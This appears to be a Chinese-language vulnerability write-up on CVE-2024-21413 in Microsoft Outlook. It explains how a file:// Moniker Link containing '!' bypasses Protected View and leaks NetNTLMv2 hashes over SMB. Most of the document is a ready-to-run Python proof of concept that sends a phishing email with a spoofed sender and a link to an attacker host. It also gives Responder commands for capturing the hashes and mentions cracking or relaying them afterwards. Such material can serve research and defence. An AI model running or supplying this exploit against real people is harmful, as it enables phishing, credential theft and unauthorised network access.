# Microsoft Outlook 凭据泄漏漏洞 (CVE-2024-21413)

## 概述 (Overview)

Microsoft Outlook 是微软公司出品的电子邮件客户端和个人信息管理器软件。此漏洞 (CVE-2024-21413) 是一种凭据泄漏漏洞，允许攻击者通过发送包含特制 `file://` 协议超链接（利用名字对象/Moniker Link 机制）的电子邮件，在用户点击该链接时绕过 Outlook 的“受保护视图” (Protected View) 安全功能，从而窃取用户的 NetNTLMv2 哈希。

该漏洞影响以下 Microsoft Office 版本 (及更早版本，具体需参考官方公告)：

*   Microsoft Office LTSC 2021 (起始版本 16.0.1)
*   Microsoft 365 企业应用版 (起始版本 16.0.1)
*   Microsoft Office 2019 (起始版本 16.0.1)
*   Microsoft Office 2016 (16.0.0 到 16.0.5435.1001 之前的版本)

## 识别特征 (Identification)

从外部扫描难以直接识别此漏洞。识别主要依赖于了解目标环境是否正在使用受影响版本的 Microsoft Outlook。攻击通常通过钓鱼邮件发起，因此无法像扫描 Web 服务那样进行主动探测。

## 漏洞原理 (Vulnerability Principle)

Outlook 能够呈现 HTML 邮件内容，并处理各种超链接，包括指向本地或网络文件的 `file://` 链接以及通过 COM 调用的名字对象链接 (Moniker Links)。

1.  **受保护视图 (Protected View):** Outlook 通常会使用“受保护视图”来打开来自不可信来源的附件或链接，以限制潜在的恶意行为，例如阻止自动连接到远程 SMB 共享。
2.  **链接处理:** 当 Outlook 遇到 `file://` 协议的链接时，正常情况下，如果目标是远程路径，可能会触发安全警告或被受保护视图拦截。
3.  **绕过机制:** 该漏洞的关键在于，攻击者可以构造一个特殊的 `file://` 链接，其路径中包含感叹号 (`!`)，例如 `file://<attacker_ip_or_hostname>/share!anything`。这种格式的链接被 Outlook 错误地处理，绕过了“受保护视图”的检查。
4.  **SMB 认证触发:** 当用户点击这个特制的链接时，由于绕过了保护机制，Outlook 会尝试通过 SMB/CIFS 协议访问指定的网络路径（即使该路径实际上并不存在于攻击者服务器上）。
5.  **凭据泄漏:** Windows 在尝试进行 SMB 连接时，会自动发送用户的 NetNTLMv2 哈希用于网络身份验证。攻击者只需在 `<attacker_ip_or_hostname>` 上运行一个 SMB 监听服务（如 Responder），即可捕获这个哈希。

**核心问题在于：** 特定格式 (`file://...!...`) 的名字对象链接 (Moniker Link) 未被 Outlook 的“受保护视图”正确处理，导致对潜在恶意 SMB 路径的访问尝试，从而在用户不知情的情况下泄露了其 NTLM 凭据哈希。虽然理论上利用名字对象链接可能导致 RCE (通过 COM)，但目前公开的利用主要集中在凭据泄漏。

## 利用步骤 (Exploitation Steps - Conceptual)

1.  **设置监听器:** 在攻击者控制的服务器上启动一个 SMB 监听器（例如使用 `Responder` 工具）来捕获传入的 NTLM 认证请求。
2.  **构造恶意链接:** 创建一个特制的 `file://` 超链接，指向攻击者的服务器，并在路径中包含 `!` 字符，例如：`file://<attacker_server_ip>/resource!trigger`。
3.  **制作钓鱼邮件:** 将此恶意超链接嵌入到一封看似无害的电子邮件中。
4.  **发送邮件:** 将该电子邮件发送给使用受影响版本 Outlook 的目标用户。
5.  **触发漏洞:** 当用户在 Outlook 中打开邮件并点击该恶意链接时，Outlook 会绕过保护机制，尝试连接到攻击者的 SMB 服务器。
6.  **捕获凭据:** 攻击者的 SMB 监听器捕获到受害者机器发送过来的 NetNTLMv2 哈希。
7.  **(后续)** 攻击者可以尝试离线破解捕获到的哈希以获取明文密码，或在支持 NTLM 中继的环境中进行中继攻击。

## 攻击演示代码 (Proof of Concept - Python Script)

以下 Python 脚本演示了如何构造并发送包含恶意链接的电子邮件：

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

# --- 配置参数 ---
sender_email = 'attacker@malicious.com'  # 伪造的发件人邮箱
sender_name = 'Important Notification'    # 伪造的发件人名称
receiver_email = 'victim@target.com'    # 目标用户的邮箱
smtp_server = 'YOUR_SMTP_SERVER'          # 用于发送邮件的 SMTP 服务器地址
smtp_port = 25                           # SMTP 端口 (通常是 25, 587, 或 465)
smtp_user = 'YOUR_SMTP_USERNAME'         # SMTP 登录用户名 (如果需要认证)
smtp_password = 'YOUR_SMTP_PASSWORD'     # SMTP 登录密码 (如果需要认证)
attacker_ip = 'ATTACKER_LISTENER_IP'     # 运行 SMB 监听器的攻击者 IP 地址
email_subject = "Action Required: Please Review Document"

# --- 构造恶意 HTML 内容 ---
# 注意: href 中的 '!' 是触发漏洞的关键
html_content = f"""\
<!DOCTYPE html>
<html lang="en">
<body>
    <p>Dear User,</p>
    <p>Please click the link below to access the shared document:</p>
    <p><a href="file://{attacker_ip}/shared!document">Click here to view document</a></p>
    <p>Thank you.</p>
</body>
</html>"""

# --- 创建邮件对象 ---
message = MIMEMultipart()
message['Subject'] = email_subject
message["From"] = formataddr((sender_name, sender_email))
message["To"] = receiver_email

# 添加 HTML 内容
msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

# --- 发送邮件 ---
try:
    # 连接到 SMTP 服务器
    # 如果使用 SSL/TLS (例如端口 465)，使用 smtplib.SMTP_SSL()
    # 如果使用 STARTTLS (例如端口 587)，使用 server.starttls()
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.ehlo() # 可选

    # 如果 SMTP 服务器需要认证
    # server.starttls() # 如果使用 STARTTLS
    # server.login(smtp_user, smtp_password)

    # 发送邮件
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print(f"Email sent successfully to {receiver_email}")

except Exception as e:
    print(f"Failed to send email: {e}")
finally:
    try:
        server.quit()
    except:
        pass # 忽略退出时的错误

```

**配合使用的工具:**

*   **Responder:** 在攻击者服务器上运行 `sudo responder -I <interface_name>` (例如 `eth0` 或 `ens5`) 来启动 SMB 监听器并捕获 NetNTLMv2 哈希。

**执行流程:**

1.  在攻击机上运行 `responder`。
2.  修改上述 Python 脚本中的 `attacker_ip` 为攻击机的 IP，并配置好 SMTP 发送参数。
3.  运行 Python 脚本将邮件发送给受害者。
4.  当受害者在易受攻击的 Outlook 客户端中点击邮件中的链接时，`responder` 将捕获到 NetNTLMv2 哈希。